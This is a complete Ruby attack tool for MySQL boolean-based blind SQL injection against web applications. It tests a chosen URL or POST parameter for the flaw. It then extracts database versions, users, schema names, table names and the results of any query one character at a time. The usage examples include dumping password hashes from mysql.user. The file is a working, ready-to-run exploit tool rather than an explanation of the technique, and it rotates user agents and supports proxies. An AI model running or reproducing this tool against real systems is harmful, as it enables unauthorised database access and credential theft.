#!/usr/bin/env ruby
#
# MySQL Boolean Blind Based Injection
# By: Hood3dRob1n
#

### PROXY SETTINGS ####
$proxy=true          #
$proxyip='127.0.0.1'  #
$proxyport=8080       #
$proxy_auth=false     #
$proxy_user=''        #
$proxy_pass=''        #
#######################

###### HTTP REQUEST #####
$ref=false              #
$referrer=''            #
$user_agent=nil         #
$cookiefile=''          #
$headers_add=false      #
$cookie_support=false   #
$headers={'Foo'=>'Bar'} #
#########################

### HTTP AUTH ###
$auth=false     #
$auth_user=''   #
$auth_pass=''   #
#################

require 'cgi'
require 'optparse'
require 'colorize'
require 'curb'

# Trap Interupts
trap("SIGINT") {puts "\n\nWARNING! CTRL+C Detected, Shutting things down....."; exit 666;}

# 31337 Banner
def banner
  puts
  puts "MySQL Boolean Blind Based Injection"
  puts "By: Hood3dRob1n"
end

# Clear Terminal
def cls
  if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
    system('cls')
  else
    system('clear')
  end
end

# Find the parameters in URL provided
# Returns a Hash{ 'param' => 'value' } or nil if no params found
def find_parameters(paramaterstring)
  parameters={}
  if not paramaterstring =~ /.+=/
    return nil
  else
    if paramaterstring =~ /.+=.+&.+/
      foo = paramaterstring.split('&')
      foo.each do |paramz|
        parameters.store(paramz.split('=')[0], paramz.split('=')[1])
      end
      return parameters
    elsif paramaterstring =~ /.+=.+;.+/
      foo = paramaterstring.split(';')
      foo.each do |paramz|
        parameters.store(paramz.split('=')[0], paramz.split('=')[1])
      end
      return parameters
    else
      k = paramaterstring.split('=')[0]
      v = paramaterstring.split('=')[1]
      parameters.store(k, v)
      return parameters
    end
  end
end

# Add URL-Encoding to String Class
class String
  # URI Encode String
  def urienc encoding=nil
    begin
      CGI::escape self
    rescue ArgumentError => e
      if e.to_s == 'invalid byte sequence in UTF-8'
        encoding = 'binary' if encoding.nil?
        CGI::escape self.force_encoding(encoding)
      else
        raise e
      end
    end
  end

  # Convert String to HEX Value with '0x' prefix for mysql friendliness
  def mysqlhex
    foo='0x'
    foo += self.each_byte.map { |b| b.to_s(16) }.join
    return foo
  end

  # HEX Decoding of mysql hex '0x'
  def mysqlhexdecode
    self.sub('0x','').scan(/../).map { |x| x.hex.chr }.join
  end
end

# Curb Wrapper Class for HTTP Request Handling
# Makes it a touch easier
class EasyCurb
  # Curl::Multi Request Option
  # Returns a Hash { 'url link' => [single response array] }
  def multi_get(arrayoflinks)
    mresponses = {}
    m = Curl::Multi.new
    # add a few easy handles
    arrayoflinks.each do |url|
      mresponses[url] = simple(url)
      m.add(mresponses[url])
    end
    begin
      m.perform
    rescue Curl::Err::ConnectionFailedError => e
	puts "Redo - Problem with Network Connection => #{e}"
    rescue Curl::Err::MalformedURLError => e
	puts "Curl Failure => #{e}"
    rescue Curl::Err::PartialFileError => e
	puts "Curl Failure => #{e}"
    rescue Curl::Err::GotNothingError => e
	puts "Curl Failure => #{e}"
    rescue Curl::Err::RecvError => e
	puts "Curl Failure => #{e}"
    rescue Curl::Err::HostResolutionError => e
	puts "Problem resolving Host Details => #{e}"
    end
    # Return our Hash with URL as Key and Simple Response Array for Value
    return mresponses
  end

  def simple(link, postdata=nil)
    agents = ['Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)',
  'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
  'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0',
  'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1',
  'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)',
  'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)',
  'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
  'Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)',
  'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00' ]

    @ch = Curl::Easy.new(link) do |curl|
      # Set Proxy Connection Details if needed
      if $proxy
        curl.proxy_url = $proxyip
        curl.proxy_port = $proxyport.to_i
        if $proxy_auth
          curl.proxypwd = "#{$proxy_user}:#{$proxy_pass}"
        end
      end

      # Set HTTP Authentication Details if needed
      if $auth
        curl.http_auth_types = :basic
        curl.username = $auth_user
        curl.password = $auth_pass
      end

      # Add custom referrer if needed
      if $ref
        curl.headers['Referer'] = "#{$referrer}"
      end

      # Add custom headers as needed
      if $headers_add
        $headers.each do |k, v|
          curl.headers["#{k}"] = "#{v}"
        end
      end

      # Add custom cookies if needed
      if $cookie_support
        curl.cookies = $cookiefile
      end

      # Set User-Agent to default or whatever was selected
      if $user_agent.nil?
        $user_agent = agents[rand(agents.size)]
      end
      curl.useragent = $user_agent

      # Setup Post Request If needed
      begin
        curl.http_post(link, "#{postdata}") if not postdata.nil?
      rescue Curl::Err::ConnectionFailedError => e
        puts "Redo - Problem with Network Connection => #{e}"
      rescue Curl::Err::MalformedURLError => e
        puts "Curl Failure => #{e}"
      rescue Curl::Err::PartialFileError => e
        puts "Curl Failure => #{e}"
      rescue Curl::Err::RecvError => e
        puts "Curl Failure => #{e}"
      rescue Curl::Err::GotNothingError => e
        puts "Curl Failure => #{e}"
      rescue Curl::Err::HostResolutionError => e
        puts "Problem resolving Host Details => #{e}"
      end
    end
  end

  # Make GET requests to given link
  # Returns an array filled with the following: 
  # response_body, response_code, repsonse_time, response_headers
  def get(getlink)
    simple(getlink)
    begin
      @ch.perform
    rescue Curl::Err::ConnectionFailedError => e
      puts "Redo - Problem with Network Connection => #{e}"
    rescue Curl::Err::MalformedURLError => e
      puts "Curl Failure => #{e}"
    rescue Curl::Err::PartialFileError => e
      puts "Curl Failure => #{e}"
    rescue Curl::Err::RecvError => e
      puts "Curl Failure => #{e}"
    rescue Curl::Err::GotNothingError => e
      puts "Curl Failure => #{e}"
    rescue Curl::Err::HostResolutionError => e
      puts "Problem resolving Host Details => #{e}"
    end
    return @ch.body_str, @ch.response_code, @ch.total_time, @ch.header_str
  end

  # Make POST requests to given link and post data
  # Returns an array filled with the following: 
  # response_body, response_code, repsonse_time, response_headers
  def post(postlink, postdata)
    simple(postlink, postdata)
    return @ch.body_str, @ch.response_code, @ch.total_time, @ch.header_str
  end
end

# Check for Boolean Blind Injection
# Returns True or False
def boolean_vuln_test(link, postdata=nil)
  r=rand(10000)
  sqli_true = "#{@prefix}aNd #{r}=#{r}#{@suffix}".urienc
  sqli_false = "#{@prefix}aNd #{r}=#{r + 1}#{@suffix}".urienc
  if postdata.nil? or postdata == ''
    # GET
    if @paramk == '[INJECTME]'
      t = link.sub('[INJECTME]', sqli_true)
      f = link.sub('[INJECTME]', sqli_false)
    else
      t = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_true}")
      f = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_false}")
    end
    trez = @http.get(t)
    frez = @http.get(f)
  else
    # POST
    if @paramk == '[INJECTME]'
      t = postdata.sub('[INJECTME]', sqli_true)
      f = postdata.sub('[INJECTME]', sqli_false)
    else
      t = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_true}")
      f = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_false}")
    end
    trez = @http.post(link, t)
    frez = @http.post(link, f)
  end
  if trez[0] == frez[0]
    return false
  else
    # Double Check Just to Be Sure
    sqli_true = "#{@prefix}aNd 1=(SELECT #{r} REGEXP #{r})#{@suffix}".urienc
    sqli_false = "#{@prefix}aNd 1=(SELECT #{r} REGEXP #{r + 1})#{@suffix}".urienc
    if postdata.nil? or postdata == ''
      # GET
      if @paramk == '[INJECTME]'
        t = link.sub('[INJECTME]', sqli_true)
        f = link.sub('[INJECTME]', sqli_false)
      else
        t = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_true}")
        f = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_false}")
      end
      trez = @http.get(t)
      frez = @http.get(f)
    else
      # POST
      if @paramk == '[INJECTME]'
        t = postdata.sub('[INJECTME]', sqli_true)
        f = postdata.sub('[INJECTME]', sqli_false)
      else
        t = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_true}")
        f = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_false}")
      end
      trez = @http.post(link, t)
      frez = @http.post(link, f)
    end
    if trez[0] == frez[0]
      return false
    else
      return true
    end
  end
end

# We need to check if data exists before spinning our wheels
# If there is data, the length will be greater than 0
# Return True if data, False if not
def data_exists(link, postdata=nil, query)
  r=rand(10000)
  sqli_true = "#{@prefix}aNd #{r}=#{r}#{@suffix}".urienc
  if postdata.nil? or postdata == ''
    # GET
    if @paramk == '[INJECTME]'
      t = link.sub('[INJECTME]', sqli_true)
    else
      t = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_true}")
    end
    trez = @http.get(t)
  else
    # POST
    if @paramk == '[INJECTME]'
      t = postdata.sub('[INJECTME]', sqli_true)
    else
      t = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{sqli_true}")
    end
    trez = @http.post(link, t)
  end
  @true = trez[0]

  # Make sure there is data in result
  inj = "#{@prefix}aNd (SeLeCT leNgTh( (#{query}) )<0)#{@suffix}".urienc
  if postdata.nil? or postdata == ''
    # GET
    if @paramk == '[INJECTME]'
      sqli = link.sub('[INJECTME]', inj)
    else
      sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
    end
    rez = @http.get(sqli)
  else
    # POST
    if @paramk == '[INJECTME]'
      sqli = postdata.sub('[INJECTME]', inj)
    else
      sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
    end
    rez = @http.post(link, sqli)
  end
  if rez[0] == @true
    puts "Result Length < 0?".light_red
    puts "Bogus Result Encountered!".light_red
    return false
  end

  # Make sure there is not too much data in result
  inj = "#{@prefix}aNd (SeLeCT leNgTh( (#{query}) )>1000000)#{@suffix}".urienc
  if postdata.nil? or postdata == ''
    # GET
    if @paramk == '[INJECTME]'
      sqli = link.sub('[INJECTME]', inj)
    else
      sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
    end
    rez = @http.get(sqli)
  else
    # POST
    if @paramk == '[INJECTME]'
      sqli = postdata.sub('[INJECTME]', inj)
    else
      sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
    end
    rez = @http.post(link, sqli)
  end
  if rez[0] == @true
    puts "Result Length > 1,000,000?".light_red
    puts "Result Length Too Great to Attempt to Return!".light_red
    return false
  end
  return true
end

# Find Length of Query & Dump Results
# Run data_exists?(query) first!
# Returns Results or nil
def sql_inject(link, postdata=nil, query)
  if not data_exists(link, postdata, query)
    puts
    puts "Doesn't appear any data exists!"
    puts "Might be privleges or value is NULL, idk...."
    puts "Double check manually to be 100% sure...."
    puts
    return nil
  end
  # Find the proper range, within 10 of the length
  baselength=10
  while(true)
    inj = "#{@prefix}aNd (SeLeCT leNgTh((#{query}))<#{baselength})#{@suffix}".urienc
    if postdata.nil? or postdata == ''
      # GET
      if @paramk == '[INJECTME]'
        sqli = link.sub('[INJECTME]', inj)
      else
        sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
      end
      rez = @http.get(sqli)
    else
      # POST
      if @paramk == '[INJECTME]'
        sqli = postdata.sub('[INJECTME]', inj)
      else
        sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
      end
      rez = @http.post(link, sqli)
    end
    if rez[0] == @true
      # baselength = baselength.to_i - 10
      if baselength.to_i < 100
        baselength = baselength.to_i - 10
      elsif baselength.to_i > 100 and baselength.to_i < 1000
        baselength = baselength.to_i - 50
      elsif baselength.to_i > 1000 and baselength.to_i < 1000000
        baselength = baselength.to_i - 100
      end
      break
    else
      if baselength.to_i < 100
        baselength = baselength.to_i + 10
      elsif baselength.to_i > 100 and baselength.to_i < 1000
        zcount = zcount.to_i + 50
      elsif baselength.to_i > 1000 and baselength.to_i < 1000000
        baselength = baselength.to_i + 100
      else
        puts "Result Length > 1,000,000?".light_red
        puts "Result Length Too Great to Attempt to Return!".light_red
        return nil
      end
      # baselength = baselength.to_i + 10
    end
  end
  # Try to cut in half
  inj = "#{@prefix}aNd (SeLeCT leNgTh((#{query}))<#{(baselength.to_i / 2)})#{@suffix}".urienc
  if postdata.nil? or postdata == ''
    # GET
    if @paramk == '[INJECTME]'
      sqli = link.sub('[INJECTME]', inj)
    else
      sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
    end
    rez = @http.get(sqli)
  else
    # POST
    if @paramk == '[INJECTME]'
      sqli = postdata.sub('[INJECTME]', inj)
    else
      sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
    end
    rez = @http.post(link, sqli)
  end
  if rez[0] == @true
    zcount=(baselength + 15)
    baselength = (baselength.to_i / 2) # Cut in half
  else
    zcount=(baselength + 25) # more padding
  end
  # Now narrow it down to the real length
  while true
    inj = "#{@prefix}aNd (SeLeCT leNgTh((#{query}))=#{baselength})#{@suffix}".urienc
    if postdata.nil? or postdata == ''
      # GET
      if @paramk == '[INJECTME]'
        sqli = link.sub('[INJECTME]', inj)
      else
        sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
      end
      rez = @http.get(sqli)
    else
      # POST
      if @paramk == '[INJECTME]'
        sqli = postdata.sub('[INJECTME]', inj)
      else
        sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
      end
      rez = @http.post(link, sqli)
    end
    if rez[0] == @true
      break
    else
      baselength = baselength.to_i + 1
    end
    if baselength.to_i > zcount.to_i
      puts "Unable to properly determine result length!".light_red
      baselength = baselength.to_i - 1
      break
    end
  end
  # Now we go get the actual result!
  reallength = baselength.to_i + 1
  char_position = 1
  results = String.new
  while char_position.to_i < reallength.to_i
    inj = "#{@prefix}aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<51)#{@suffix}".urienc
    if postdata.nil? or postdata == ''
      # GET
      if @paramk == '[INJECTME]'
        sqli = link.sub('[INJECTME]', inj)
      else
        sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
      end
      rez = @http.get(sqli)
    else
      # POST
      if @paramk == '[INJECTME]'
        sqli = postdata.sub('[INJECTME]', inj)
      else
        sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
      end
      rez = @http.post(link, sqli)
    end
    if rez[0] == @true
      starts = 0
      ends = 51
    else
      inj = "#{@prefix}aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<101)#{@suffix}".urienc
      if postdata.nil? or postdata == ''
        # GET
        if @paramk == '[INJECTME]'
          sqli = link.sub('[INJECTME]', inj)
        else
          sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
        end
        rez = @http.get(sqli)
      else
        # POST
        if @paramk == '[INJECTME]'
          sqli = postdata.sub('[INJECTME]', inj)
        else
          sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
        end
        rez = @http.post(link, sqli)
      end
      if rez[0] == @true
        starts = 50
        ends = 101
      else
        inj = "#{@prefix}aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<151)#{@suffix}".urienc
        if postdata.nil? or postdata == ''
          # GET
          if @paramk == '[INJECTME]'
            sqli = link.sub('[INJECTME]', inj)
          else
            sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
          end
          rez = @http.get(sqli)
        else
          # POST
          if @paramk == '[INJECTME]'
            sqli = postdata.sub('[INJECTME]', inj)
          else
            sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
          end
          rez = @http.post(link, sqli)
        end
        if rez[0] == @true
          starts = 100
          ends = 151
        else
          inj = "#{@prefix}aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<201)#{@suffix}".urienc
          if postdata.nil? or postdata == ''
            # GET
            if @paramk == '[INJECTME]'
              sqli = link.sub('[INJECTME]', inj)
            else
              sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
            end
            rez = @http.get(sqli)
          else
            # POST
            if @paramk == '[INJECTME]'
              sqli = postdata.sub('[INJECTME]', inj)
            else
              sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
            end
            rez = @http.post(link, sqli)
          end
          if rez[0] == @true
            starts = 150
            ends = 201
          else
            starts = 200
            ends = 255
          end
        end
      end
    end
    # Try to cut the range from 50 to 25 now
    inj = "#{@prefix}aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<#{ends - 25})#{@suffix}".urienc
    if postdata.nil? or postdata == ''
      # GET
      if @paramk == '[INJECTME]'
        sqli = link.sub('[INJECTME]', inj)
      else
        sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
      end
      rez = @http.get(sqli)
    else
      # POST
      if @paramk == '[INJECTME]'
        sqli = postdata.sub('[INJECTME]', inj)
      else
        sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
      end
      rez = @http.post(link, sqli)
    end
    if rez[0] == @true
      ends = ends - 25
    else
      starts = ends - 25
    end
    # Try to cut the range from 25 to 10 or 15 now
    inj = "#{@prefix}aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<#{ends - 10})#{@suffix}".urienc
    if postdata.nil? or postdata == ''
      # GET
      if @paramk == '[INJECTME]'
        sqli = link.sub('[INJECTME]', inj)
      else
        sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
      end
      rez = @http.get(sqli)
    else
      # POST
      if @paramk == '[INJECTME]'
        sqli = postdata.sub('[INJECTME]', inj)
      else
        sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
      end
      rez = @http.post(link, sqli)
    end
    if rez[0] == @true
      ends = ends - 10
    else
      starts = ends - 10
    end

    # Not Done Yet....
    pad=' '*20
    while(starts.to_i < ends.to_i)
      inj = "#{@prefix}aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))=#{starts})#{@suffix}".urienc
      if postdata.nil? or postdata == ''
        # GET
        if @paramk == '[INJECTME]'
          sqli = link.sub('[INJECTME]', inj)
        else
          sqli = link.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
        end
        rez = @http.get(sqli)
      else
        # POST
        if @paramk == '[INJECTME]'
          sqli = postdata.sub('[INJECTME]', inj)
        else
          sqli = postdata.sub("#{@paramk}=#{@paramv}", "#{@paramk}=#{@paramv}#{inj}")
        end
        rez = @http.post(link, sqli)
      end
      if rez[0] == @true
        results += starts.chr
        print "\r#{results.chomp}".cyan + pad
        char_position = char_position.to_i + 1
        break
      else
        print "\r#{results.chomp}".cyan + "#{starts.chr.chomp}".white + pad unless starts < 32 or starts > 126
        starts = starts.to_i + 1
      end
    end
  end
  puts "\n"
  return results
end


# Main --
options = {}
optparse = OptionParser.new do |opts| 
  opts.banner = "Usage: #{$0} [OPTIONS]"
  opts.separator ""
  opts.separator "EX: #{$0} -u 'http://somesite.com/index.php?foo=vuln&bar=666' -p foo -b --dbs"
  opts.separator "EX: #{$0} -u http://192.168.2.43/sqli-labs/Less-5/index.php?id=1 -p id -s \"' \" -e '-- -' -b --dbs --tables"
  opts.separator "EX: #{$0} -u \"http://192.168.2.43/sqli-labs/Less-8/index.php?id=1')[INJECTME]\" -q \"SELECT concat(host,0x3a,user,0x3a,password) FROM mysql.user where file_priv='Y' limit 1,1\""
  opts.separator ""
  opts.separator "Options: "
  opts.on('-u', '--url URL', "\n\tURL to Inject") do |target|
    options[:target] = target.chomp
  end
  opts.on('-d', '--data DATA', "\n\tPost Request Data") do |data|
    options[:post] = data.chomp
  end
  opts.on('-p', '--parameter PAR', "\n\tVulnerable Parameter to Inject") do |param|
    options[:param] = param.chomp
  end
  opts.on('-s', '--start STRING', "\n\tInjection Prefix to Use (i.e. ' ,') ,\") ,etc) ") do |param|
    options[:start] = param.chomp
  end
  opts.on('-e', '--end STRING', "\n\tInjection Ending or Delimeter to Use (i.e. --, #, -- -, /*, etc)") do |param|
    options[:end] = param.chomp
  end
  opts.on('-b', '--basic', "\n\tEnumerate Basic Information") do |basic|
    options[:basic] = true
  end
  opts.on('-y', '--dbs', "\n\tEnumerate Available Databases") do |dbs|
    options[:dbs] = true
  end
  opts.on('-t', '--tables', "\n\tEnumerate Tables from Current Databases") do |tbl|
    options[:tables] = true
  end
  opts.on('-q', '--query SQL', "\n\tSQL Query to Run") do |param|
    options[:query] = param.chomp
  end
  opts.on('-h', '--help', "\n\tHelp Menu") do 
    cls
    banner
    puts
    puts opts
    puts
    exit 69;
  end
end
begin
  foo = ARGV[0] || ARGV[0] = "-h"
  optparse.parse!
  if options[:param].nil?
    if options[:target] =~ /\[INJECTME\]/i
      options[:param] = '[INJECTME]'
    end
  end
  mandatory = [:target,:param]
  missing = mandatory.select{ |param| options[param].nil? }
  if not missing.empty?
    cls
    banner
    puts
    puts "Missing options: #{missing.join(', ')}"
    puts optparse
    exit 666;
  end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
  cls
  banner
  puts
  puts $!.to_s
  puts
  puts optparse
  puts
  exit 666;   
end

# Identify Parameter or Injection Marker
# Helps with injection placements later
if options[:param] == '[INJECTME]'
  @paramk = options[:param]
  @paramv = 'foofucked'
else
  if options[:post].nil?
    paramaters = find_parameters(URI.parse(options[:target]).query)
  else
    paramaters = find_parameters(options[:post])
  end
  begin
    paramaters.each do |key, value|
      if options[:param] == key
        @paramk = options[:param]
        @paramv = value
      end
    end
  rescue
    puts "No Parameters Matched or Injection Marker Not Found!"
  end
end

# String Based Injections
# or Breakouts add as prefix
if options[:start].nil?
  @prefix = ' '
else
  @prefix = options[:start]
end

# This is our query delimeter
if options[:end].nil?
  @suffix = '-- -'
else
  @suffix = options[:end]
end

# Create a re-usable handle for http requests
@http=EasyCurb.new

# Now we go inject stuff :)
if boolean_vuln_test(options[:target], options[:post])
  puts "Appers to be vuln, starting injection now".light_green  + ".....".white
  # Enumerate basic info
  if options[:basic]
    version = sql_inject(options[:target], options[:post], 'SELECT VERSION()')
    user = sql_inject(options[:target], options[:post], 'SELECT USER()')
    db = sql_inject(options[:target], options[:post], 'SELECT DATABASE()')

    puts "Basic Info".light_green + ": ".white
    puts "Version".light_green + ": #{version}".white unless version.nil?
    puts "User".light_green + ": #{user}".white unless user.nil?
    puts "DB".light_green + ": #{db}".white unless db.nil?
  end

  # Enumerate Available Databases
  if options[:dbs]
    v = sql_inject(options[:target], options[:post], 'MID((SELECT VERSION()),1,1)')
    if v.to_i >= 5
      dbz=[]
      dbs_count = sql_inject(options[:target], options[:post], 'SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA')
      puts "Fetching ".light_green + "#{dbs_count}".white + " Databases".light_green + "....".white unless dbs_count.nil?
      if dbs_count.to_i > 0
        0.upto(dbs_count.to_i - 1).each do |zcount|
          results = sql_inject(options[:target], options[:post], "SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{zcount},1")
          pad = ' ' * (results.size + 25) unless results.nil? or results == ''
          pad = ' ' * 50 if results.nil? or results == ''
          print "\r(#{zcount})> #{results}#{pad}".cyan unless results == ''
          dbz << results unless results == ''
        end
        puts "\n"
        if dbz.empty?
          puts
          puts "Unable to get any database names!"
          puts "Lack of privileges?"
          puts "Possible Solutions include:"
          puts "A) Become HR's best friend by updating the code and sending him a copy"
          puts "B) Tweak Settings and try things again"
          puts "C) Be a bawz and do it manually"
          puts
        else	
          puts "DBS".light_green + ": #{dbz.join(', ').sub(/, $/, '')}".white
        end
      else
        puts "Unable to determine number of available database, sorry".light_red + "....".white
      end
    else
      puts "MySQL Version < 5 - No Information Schema Available".light_red + "!".white
    end 
  end

  # Get Tables from Current DB
  if options[:tables]
    v = sql_inject(options[:target], options[:post], 'MID((SELECT VERSION()),1,1)')
    if v.to_i >= 5
      tables=[]
      tbl_count = sql_inject(options[:target], options[:post], 'SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()')
      if tbl_count.to_i > 0
        puts "Fetching ".light_green + "#{tbl_count}".white + " Tables from Current DB".light_green unless tbl_count.nil?
        0.upto(tbl_count.to_i - 1).each do |zcount|
          results = sql_inject(options[:target], options[:post], "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT #{zcount},1")
          tables << results unless results == ''
        end
        puts "\n"
        if dbz.empty?
          puts
          puts "Unable to get any tables from current db!"
          puts "Lack of privileges?"
          puts "Possible Solutions include:"
          puts "A) Become HR's best friend by updating the code and sending him a copy"
          puts "B) Tweak Settings and try things again"
          puts "C) Be a bawz and do it manually"
          puts
        else	
          puts "Tables".light_green + ": #{tables.join(', ').sub(/, $/, '')}".white
        end
      else
        puts "Unable to determine number of tables in current database, sorry".light_red + "....".white
      end
    else
      puts "MySQL Version < 5 - No Information Schema Available".light_red + "!".white
    end 
  end

  # Run Custom Embedded SQL Query
  if not options[:query].nil?
    results = sql_inject(options[:target], options[:post], options[:query])
    if not results.nil?
      puts "SQL".light_green + ": #{options[:query]}".white
      puts "Result".light_green + ": #{results}".white
    end
  end
else
  puts
  puts "Link doesn't appear to be injectable through MySQL Conditional Errors!"
  puts "Sorry, double check manually to be sure...."
  puts
end
#EOF
